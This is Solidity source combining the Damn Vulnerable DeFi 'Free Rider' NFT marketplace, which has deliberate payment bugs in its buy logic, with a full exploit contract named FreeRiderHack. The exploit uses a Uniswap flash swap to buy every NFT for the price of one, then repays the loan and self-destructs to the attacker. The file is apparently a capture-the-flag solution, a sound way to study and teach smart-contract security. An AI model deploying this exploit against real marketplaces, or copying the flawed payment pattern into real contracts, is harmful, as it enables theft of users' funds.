// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {
    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public offersCount;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);

    error InvalidPricesAmount();
    error InvalidTokensAmount();
    error InvalidPrice();
    error CallerNotOwner(uint256 tokenId);
    error InvalidApproval();
    error TokenNotOffered(uint256 tokenId);
    error InsufficientPayment();

    constructor(uint256 amount) payable {
        DamnValuableNFT _token = new DamnValuableNFT();
        _token.renounceOwnership();
        for (uint256 i = 0; i < amount; ) {
            _token.safeMint(msg.sender);
            unchecked {
                ++i;
            }
        }
        token = _token;
    }

    function offerMany(
        uint256[] calldata tokenIds,
        uint256[] calldata prices
    ) external nonReentrant {
        uint256 amount = tokenIds.length;
        if (amount == 0) revert InvalidTokensAmount();

        if (amount != prices.length) revert InvalidPricesAmount();

        for (uint256 i = 0; i < amount; ) {
            unchecked {
                _offerOne(tokenIds[i], prices[i]);
                ++i;
            }
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        DamnValuableNFT _token = token; // gas savings

        if (price == 0) revert InvalidPrice();

        if (msg.sender != _token.ownerOf(tokenId))
            revert CallerNotOwner(tokenId);

        if (
            _token.getApproved(tokenId) != address(this) &&
            !_token.isApprovedForAll(msg.sender, address(this))
        ) revert InvalidApproval();

        offers[tokenId] = price;

        assembly {
            // gas savings
            sstore(0x02, add(sload(0x02), 0x01))
        }

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(
        uint256[] calldata tokenIds
    ) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; ) {
            unchecked {
                _buyOne(tokenIds[i]);
                ++i;
            }
        }
    }

    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0) revert TokenNotOffered(tokenId);

        if (msg.value < priceToPay) revert InsufficientPayment();

        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }

    receive() external payable {}
}

import "../DamnValuableToken.sol";
import "../DamnValuableNFT.sol";
import "../free-rider/FreeRiderBuyer.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";

contract FreeRiderHack is IUniswapV2Callee, IERC721Receiver {
    address immutable attacker;
    IUniswapV2Pair immutable uniswapPair;
    FreeRiderNFTMarketplace immutable nftMarketplace;
    IWETH immutable weth;
    IERC721 immutable nft;
    address freeRiderBuyer;
    uint8 immutable amountOfNFT;
    uint256 immutable nftPrice;

    constructor(
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _nftMarketplace,
        IWETH _weth,
        address _freeRiderBuyer,
        uint8 _amountOfNFT,
        uint256 _nftPrice
    ) {
        attacker = msg.sender;
        uniswapPair = _uniswapPair;
        nftMarketplace = _nftMarketplace;
        weth = _weth;
        nft = _nftMarketplace.token();
        freeRiderBuyer = _freeRiderBuyer;
        amountOfNFT = _amountOfNFT;
        nftPrice = _nftPrice;
    }

    //TODO: 1 flashloan for 15 weth
    function attack() external {
        // need to pass some data to trigger uniswapV2Call
        // borrow 15 ether of WETH
        bytes memory data = abi.encode(uniswapPair.token0(), nftPrice);
        uniswapPair.swap(nftPrice, 0, address(this), data);
    }

    // 2. uniswap weth to eth
    function uniswapV2Call(
        address,
        uint,
        uint,
        bytes calldata _data
    ) external override {
        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));

        // computing for 0.3% fee
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        // unwrap WETH
        weth.withdraw(amount);

        // 3. buy all the NFT from marketplace
        uint256[] memory tokenIds = new uint256[](amountOfNFT);
        for (uint256 tokenId = 0; tokenId < amountOfNFT; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }
        nftMarketplace.buyMany{value: nftPrice}(tokenIds);

        // send all of the nft to the FreeRiderBuyer contract
        for (uint256 tokenId = 0; tokenId < amountOfNFT; tokenId++) {
            tokenIds[tokenId] = tokenId;
            nft.safeTransferFrom(address(this), freeRiderBuyer, tokenId);
        }

        // wrap enough WETH9 to repay our debt
        weth.deposit{value: amountToRepay}();

        // 5. repay loan to uniswap
        weth.transfer(address(uniswapPair), amountToRepay);

        // selfdestruct to the owner
        selfdestruct(payable(attacker));
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
